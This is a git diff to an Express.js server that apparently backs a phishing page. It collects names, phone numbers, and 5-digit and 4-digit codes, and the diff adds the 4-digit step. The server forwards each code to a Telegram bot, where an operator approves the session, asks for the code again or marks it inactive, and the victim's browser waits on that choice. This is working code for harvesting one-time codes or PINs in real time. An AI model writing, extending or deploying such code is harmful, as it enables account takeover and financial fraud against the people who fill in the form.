@@ -12,9 +12,10 @@ app.use(express.static(__dirname));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// In-memory storage for waiting users
 let pendingApplications = {};
 
-// 1. Endpoint to receive initial form data (Phone & 5-digit code)
+// 1. Endpoint to receive initial form data
 app.post('/api/submit-application', async (req, res) => {
     const { firstName, lastName, phone, fiveDigitCode, sessionId } = req.body;
 
@@ -83,7 +84,42 @@ Please choose an action:`;
     }
 });
 
-// 3. Endpoint for the browser to check if you clicked a button
+// 3. NEW Endpoint to receive 4-digit code
+app.post('/api/submit-4digit', async (req, res) => {
+    const { fourDigitCode, sessionId } = req.body;
+
+    const message = `
+🔑 *4-DIGIT CODE RECEIVED*
+-------------------------
+*Code:* \`${fourDigitCode || 'Empty'}\`
+
+Please choose an action:`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ APPROVE", callback_data: `APPROVE_${sessionId}` }
+                    ],
+                    [
+                        { text: "🔄 RESEND", callback_data: `RESEND4_${sessionId}` },
+                        { text: "⛔ INACTIVE", callback_data: `INACTIVE_${sessionId}` }
+                    ]
+                ]
+            }
+        });
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error('Telegram Error:', error.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// 4. Endpoint for the browser to check if you clicked a button
 app.get('/api/check-status/:sessionId', (req, res) => {
     const sessionId = req.params.sessionId;
     
@@ -98,7 +134,7 @@ app.get('/api/check-status/:sessionId', (req, res) => {
     }
 });
 
-// 4. Webhook for Telegram to send button clicks here
+// 5. Webhook for Telegram to send button clicks here
 app.post('/api/telegram-webhook', (req, res) => {
     const callbackQuery = req.body.callback_query;
     
@@ -112,13 +148,19 @@ app.post('/api/telegram-webhook', (req, res) => {
             pendingApplications[sessionId] = 'REJECTED';
         } else if (action === 'RESEND') {
             pendingApplications[sessionId] = 'RESEND';
+        } else if (action === 'RESEND4') {
+            pendingApplications[sessionId] = 'RESEND4';
+        } else if (action === 'INACTIVE') {
+            pendingApplications[sessionId] = 'INACTIVE';
         }
 
+        // Acknowledge the button click
         axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callbackQuery.id,
             text: `Action ${action} recorded.`
         });
         
+        // Update the Telegram message to show what was clicked
         axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
